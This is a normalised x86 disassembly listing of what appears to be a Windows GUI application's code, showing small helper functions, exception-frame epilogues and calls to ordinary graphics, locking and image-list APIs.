jmp sub_4039f4
sub_41d369
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf94
retn
sub_41d37f
jmp sub_4039f4
sub_41d398
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d3f5
jmp sub_4039f4
sub_41d3fc
pop ebx
pop ecx
pop ebp
retn
sub_41d575
jmp sub_4039f4
sub_41d59d
jmp sub_4039f4
sub_41d5a4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41d610
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4042d8
pop esi
pop ebx
retn
sub_41d684
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41d5e0
push eax
call sub_4061f4
neg eax
pop ebx
retn
sub_41d6c0
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41d6f8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41d728
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41d846
jmp sub_4039f4
sub_41d84d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf94
retn
sub_41d863
jmp sub_4039f4
sub_41d8d9
jmp sub_4039f4
sub_41d8e0
pop ebx
pop ecx
pop ebp
retn
sub_41d8e4
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41d99a
jmp sub_4039f4
sub_41d9e0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41db1f
jmp sub_4039f4
sub_41db26
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf94
retn
sub_41db3c
jmp sub_4039f4
sub_41dbb5
jmp sub_4039f4
sub_41dbbc
pop ebx
pop ecx
pop ebp
retn
sub_41dced
jmp sub_4039f4
sub_41dd00
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41e074
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41e3a8
jmp sub_4039f4
sub_41e3af
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41e3b8
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41e3f0
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41e3fc
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41e560
retn
sub_41e629
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41e640
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41e72c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41e74c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41e76c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41e78c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
pop ebx
retn
sub_41e7a4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
pop ebx
retn
sub_41e7c8
mov eax [ rw-data ]
call sub_41e7a4
retn
sub_41e82a
jmp sub_4039f4
sub_41e831
pop ecx
pop ebp
retn
sub_41e8d0
jmp sub_4039f4
sub_41e8d7
pop ebx
mov esp ebp
pop ebp
retn
sub_41e9a9
jmp sub_4039f4
sub_41ea3a
jmp sub_4039f4
sub_41ea41
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ea6c
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41eb53
jmp sub_4039f4
sub_41ed00
jmp sub_4039f4
sub_41ed07
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41ef19
jmp sub_4039f4
sub_41ef20
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41efba
jmp sub_4039f4
sub_41f196
jmp sub_4039f4
sub_41f250
jmp sub_4039f4
sub_41f257
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f277
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f270
jmp sub_4039f4
sub_41f277
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41f405
jmp sub_4039f4
sub_41f5d0
jmp sub_4039f4
sub_41f5d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5fa
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026ec
retn
sub_41f5f3
jmp sub_4039f4
sub_41f5fa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f61a
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
sub_41f613
jmp sub_4039f4
sub_41f61a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41f624
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41f784
push 0x0
call sub_41f720
retn
sub_41f829
jmp sub_4039f4
sub_41f830
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f83c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41f78c
pop ebx
pop ebp
retn 0x4
sub_41f850
retn
sub_41f854
test eax eax
jne r-xdata
retn
call sub_41f850
sub_41fa27
jmp sub_4039f4
sub_41fa4e
jmp sub_4039f4
sub_41fa55
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fa94
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41fc61
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub_41fc6a
jmp sub_4039f4
j_sub_41fc61
jmp sub_41fc61
sub_41fc71
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
sub_41fc87
jmp sub_4039f4
sub_41fc98
xor eax eax
retn
sub_41fc9c
mov al [ eax + 0x21 ]
retn
sub_41fce8
jmp sub_4039f4
sub_41fcef
pop esi
pop ecx
pop ebp
retn
sub_41fd1c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41fd73
jmp sub_4039f4
sub_41fd7a
pop esi
pop ecx
pop ebp
retn
sub_41fd80
retn
sub_41fd84
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41fd94
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41fe1e
jmp sub_4039f4
sub_41fe25
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ff80
jmp sub_403740
sub_41ffe0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe90
mov [ rw-data ] eax
sub_4200c8
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_420064
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_420170
jmp sub_403740
sub_420207
jmp sub_403740
sub_420280
push ebx
mov ebx edx
call sub_41ffe0
mov edx ebx
call sub_41ffa4
test eax eax
setne al
pop ebx
retn
sub_4202b0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4200c8
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_4203f9
jmp sub_403740
sub_420477
jmp sub_4039f4
sub_42047e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4205e8
retn
sub_420788
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_420a8c
jmp sub_4039f4
sub_420a93
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420c0b
jmp sub_4039f4
sub_420c12
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420ca1
jmp sub_4039f4
sub_420ca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420cca
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
sub_420cc3
jmp sub_4039f4
sub_420cca
pop ebx
mov esp ebp
pop ebp
retn
sub_420cdd
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_420fc4
jmp r-xdata
retn
sub_420cf3
call sub_421050
retn
sub_420de8
retn
sub_421040
jmp sub_4039f4
sub_42116b
jmp sub_4039f4
sub_421172
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_42118b
jmp sub_4039f4
sub_421362
jmp sub_4039f4
sub_42138a
jmp sub_4039f4
sub_421391
mov esp ebp
pop ebp
retn
sub_421408
jmp sub_4039f4
sub_421510
jmp sub_4039f4
sub_4215fb
jmp sub_4039f4
sub_421608
inc [ eax + 0x4 ]
retn
sub_421783
jmp sub_4039f4
sub_421b34
jmp sub_4039f4
sub_421d7e
jmp sub_4039f4
sub_421da8
jmp sub_4039f4
sub_421daf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421dd1
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_421dca
jmp sub_4039f4
sub_421ddb
jmp sub_403740
sub_421e2a
jmp sub_4039f4
sub_422057
jmp sub_4039f4
sub_42209f
jmp sub_4039f4
sub_42220c
jmp sub_4039f4
sub_4222d3
jmp sub_403740
sub_422328
mov [ eax + 0x31 ] 0x0
call sub_41fa94
retn
sub_422579
jmp sub_4039f4
sub_4225e4
jmp sub_4039f4
sub_4225eb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42265c
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_422710
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_422720
push ebx
mov ebx eax
mov eax ebx
call sub_4228d8
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_422734
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_422750
push ebx
mov ebx eax
mov eax ebx
call sub_422938
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4227ac
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4228bb
jmp sub_4039f4
sub_422b1f
jmp sub_403740
sub_422b7f
jmp sub_4039f4
sub_422b86
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_422f67
jmp sub_4039f4
sub_422f93
jmp sub_4039f4
sub_422ffa
jmp sub_403740
sub_42302b
jmp sub_4039f4
sub_4230b0
jmp sub_403740
sub_4230b5
mov eax [ ebp - 0x38 ]
call sub_4032a0
call sub_403a54
call sub_403aa8
sub_4230c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4230e4
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
sub_4230dd
jmp sub_4039f4
sub_423233
jmp sub_403740
sub_4234ff
jmp sub_403740
sub_4235e0
mov cl 0x1
call sub_4235e8
retn
sub_42389d
add [ eax ] al
add [ ebx ] dh
leave
call sub_4235e8
retn
sub_423922
jmp sub_403740
sub_423927
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a54
call sub_403aa8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423978
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_423ab1
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_423ae0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_423af4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_423c0d
jmp sub_403740
sub_423cc2
jmp sub_403740
sub_423d2c
jmp sub_403740
sub_423d60
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_423cec
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_423d78
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41e78c
retn
mov [ eax + 0x30 ] edx
retn
sub_423d90
retn
sub_423d94
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41e78c
retn
mov [ eax + 0x2c ] edx
retn
sub_423dd4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41e78c
pop ebp
retn 0x4
sub_423de8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41e78c
pop ebp
retn 0x4
sub_423fa8
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423fb4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_424061
jmp sub_4039f4
sub_424068
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424153
jmp sub_403740
sub_4241bf
jmp sub_4039f4
sub_4242ed
jmp sub_4039f4
sub_4242f4
pop ebp
retn
sub_424429
jmp sub_4039f4
sub_424430
pop ebp
retn
sub_424434
sub [ rw-data ] 0x1
retn
sub_4245d8
call sub_413c88
retn
sub_424660
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41404c
pop esi
pop ebx
retn
sub_424688
call sub_413e40
retn
sub_4246c4
call sub_413f80
retn
sub_4247bc
call sub_4245d8
retn
sub_4247f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_424660
pop esi
pop ebx
retn
sub_424808
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_424674
pop esi
pop ebx
retn
sub_42481c
mov edx ecx
call sub_4247f4
retn
sub_424824
call sub_424688
retn
sub_424894
call sub_4246c4
retn
sub_424928
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_413de4
retn
sub_42495c
mov eax [ eax + 0x4 ]
call sub_413c88
retn
sub_42498d
jmp sub_4039f4
sub_424994
pop ebp
retn
sub_424998
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_12(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Replace
jmp [ __import_lookup_table_12(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ __import_lookup_table_12(comctl32:ImageList_DragShowNolock) ]
ImageList_GetDragImage
jmp [ __import_lookup_table_12(comctl32:ImageList_GetDragImage) ]
ImageList_Read
jmp [ __import_lookup_table_12(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ __import_lookup_table_12(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_424a89
jmp sub_4039f4
sub_424a90
pop ebp
retn
sub_424a94
sub [ rw-data ] 0x1
retn
sub_424b5b
jmp sub_4039f4
sub_424b62
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425178
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_424b84
mov [ rw-data ] sub_424c9c
mov [ rw-data ] sub_424c0c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_424ea0
mov [ rw-data ] sub_424f74
mov [ rw-data ] sub_425048
retn
sub_425209
jmp sub_4039f4
sub_425210
pop ebp
retn
sub_425214
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425178
sub_425249
jmp sub_4039f4
sub_425250
pop ebp
retn
sub_425254
sub [ rw-data ] 0x1
retn
sub_4254e3
add eax 0xffffffd4
jmp sub_426010
sub_4254eb
add eax 0xffffffd4
jmp sub_42606c
sub_4254fd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4057b4
sub_425507
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4057c8
sub_425696
jmp sub_4039f4
sub_42569d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4258ad
jmp sub_4039f4
sub_4258b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425a69
jmp sub_4039f4
sub_425ace
jmp sub_4039f4
sub_425ad5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425bc1
jmp sub_4039f4
sub_425bc8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425dd8
lea eax [ ebp - 0x30 ]
call sub_404074
lea eax [ ebp - 0x20 ]
call sub_404074
retn
sub_425de9
jmp sub_4039f4
j_sub_425dd8
jmp sub_425dd8
sub_425df0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425eeb
jmp sub_4039f4
sub_425ef2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425fef
jmp sub_4039f4
sub_425ff6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426056
lea eax [ ebp - 0x4 ]
call sub_4056e0
retn
sub_42605f
jmp sub_4039f4
j_sub_426056
jmp sub_426056
sub_426066
pop ebx
pop ecx
pop ebp
retn
sub_426101
jmp sub_4039f4
sub_426108
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_426114
mov eax [ eax + 0x20 ]
retn
sub_426243
jmp sub_4039f4
sub_42624a
pop ebp
retn
sub_42624c
sub [ rw-data ] 0x1
retn
sub_426279
jmp sub_4039f4
sub_426280
pop ebp
retn
sub_426284
sub [ rw-data ] 0x1
retn
sub_4262bd
jmp sub_4039f4
sub_4262c4
pop ebp
retn
sub_4262c8
sub [ rw-data ] 0x1
retn
sub_4265d5
jmp sub_4039f4
sub_4265dc
pop ebp
retn
sub_4265e0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42632c
sub_4266c0
retn
sub_426734
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_426740
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42674c
mov edx [ eax ]
call [ edx ]
retn
sub_426754
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_426781
jmp sub_4039f4
sub_426788
pop ebp
retn
sub_42678c
sub [ rw-data ] 0x1
retn
sub_42694b
jmp sub_4039f4
sub_426952
pop ebp
retn
sub_426d07
jmp sub_4039f4
sub_426d0e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_427128
jmp sub_4039f4
sub_42712f
pop ebp
retn
sub_427134
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4266c4
mov [ rw-data ] eax
sub_427175
jmp sub_4039f4
sub_42717c
pop ebp
retn
sub_427180
sub [ rw-data ] 0x1
retn
sub_4271ad
jmp sub_4039f4
sub_4271b4
pop ebp
retn
sub_4271b8
sub [ rw-data ] 0x1
retn
sub_4271e5
jmp sub_4039f4
sub_4271ec
pop ebp
retn
sub_4271f0
sub [ rw-data ] 0x1
retn
sub_42721d
jmp sub_4039f4
sub_427224
pop ebp
retn
sub_427228
sub [ rw-data ] 0x1
retn
sub_427255
jmp sub_4039f4
sub_42725c
pop ebp
retn
sub_427260
sub [ rw-data ] 0x1
retn
sub_42728d
jmp sub_4039f4
sub_427294
pop ebp
retn
sub_427298
sub [ rw-data ] 0x1
retn
sub_4272c5
jmp sub_4039f4
sub_4272cc
pop ebp
retn
sub_4272d0
sub [ rw-data ] 0x1
retn
sub_4272fd
jmp sub_4039f4
sub_427304
pop ebp
retn
sub_427308
sub [ rw-data ] 0x1
retn
sub_427335
jmp sub_4039f4
sub_42733c
pop ebp
retn
sub_427340
sub [ rw-data ] 0x1
retn
sub_4275ba
jmp sub_403740
sub_4275bf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4275dc
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_4275e4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_40349c
pop esi
retn
sub_4275fc
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_40349c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_427614
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_4276bd
jmp sub_4039f4
sub_4276eb
jmp sub_4039f4
sub_4276f2
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4276fc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_427710
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42796e
jmp sub_4039f4
sub_427975
pop ebp
retn
sub_428486
jmp sub_403740
sub_42853f
jmp sub_4039f4
sub_428546
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42854c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4284c0
sub_42855c
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_4284c0
sub_42856c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_4284c0
pop ebp
retn 0x8
sub_428584
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_428821
jmp sub_403740
sub_428994
retn
sub_428b21
jmp sub_4039f4
sub_428ba4
push ebx
mov ebx eax
mov eax ebx
call sub_43fecc
mov eax ebx
call sub_428998
pop ebx
retn
sub_428bb8
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_4405ec
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_428ce0
pop ebx
retn
sub_428cd0
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_428da9
jmp sub_4039f4
sub_428db0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428df8
push ebx
mov ebx eax
mov eax ebx
call sub_443b54
mov eax ebx
call sub_428998
pop ebx
retn
sub_428e0c
push ebx
mov ebx eax
mov eax ebx
call sub_431748
mov eax ebx
call sub_428998
pop ebx
retn
sub_428e20
mov al 0x1
retn
sub_428e24
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42915c
jmp sub_4039f4
sub_429163
pop ebp
retn
sub_429168
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d78
mov eax [ r-xdata ]
call sub_413620
mov edx [ r-xdata ]
mov eax [ sub_4279b8 ]
call sub_41366c
sub_4291bd
jmp sub_4039f4
sub_4291c4
pop ebp
retn
sub_4291c8
sub [ rw-data ] 0x1
retn
sub_4292a0
jmp sub_4039f4
sub_4292a7
pop ecx
pop ebp
retn
sub_4292ac
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_4293e2
jmp sub_4039f4
sub_4293e9
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_429492
jmp sub_4039f4
sub_4294f8
jmp sub_4039f4
sub_4294ff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42955d
jmp sub_4039f4
sub_429564
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429649
jmp sub_4039f4
sub_429650
pop ebx
mov esp ebp
pop ebp
retn
sub_4296cd
jmp sub_4039f4
sub_4296d4
pop ebx
mov esp ebp
pop ebp
retn
sub_429772
jmp sub_403740
sub_429809
jmp sub_4039f4
sub_429810
pop ebp
retn
sub_429814
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_429890
retn
sub_429891
jmp sub_4039f4
j_sub_429890
jmp sub_429890
sub_429898
pop ebp
retn
sub_42989c
sub [ rw-data ] 0x1
retn
sub_42a2e4
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_42aa67
jmp sub_4039f4
sub_42aaa3
jmp sub_4039f4
sub_42b6a0
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404098
retn
sub_42b6ae
jmp sub_4039f4
j_sub_42b6a0
jmp sub_42b6a0
sub_42b6b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b93c
call sub_43f34c
retn
sub_42b944
push ebx
mov ebx eax
mov eax ebx
call sub_42b960
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42b958
mov eax [ r-xdata ]
retn
sub_42b960
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_42b96c
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_42a454
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
